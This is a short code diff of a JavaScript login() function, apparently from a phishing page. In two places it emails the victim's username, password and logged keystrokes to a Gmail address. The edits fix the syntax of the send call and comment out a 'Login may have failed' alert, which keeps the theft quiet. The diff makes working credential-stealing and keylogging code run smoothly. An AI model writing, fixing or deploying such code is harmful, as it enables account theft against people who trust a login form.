@@ -144,8 +144,8 @@ function login() {
     From: "usernames@gmail.com",
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
-  }).then(
-  
+  }).then()
+  // createCustomAlert('Login may have failed'));
 
 }
 
@@ -350,8 +350,9 @@ function login() {
     From: "usernames@gmail.com",
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br>Password: " + password.value() + "<br><br><br>Keys pressed:<br>" + clickedKeys
-  }).then(
-  
+  }).then()
+  //createCustomAlert('Login may have failed'));
+
 
 }
 
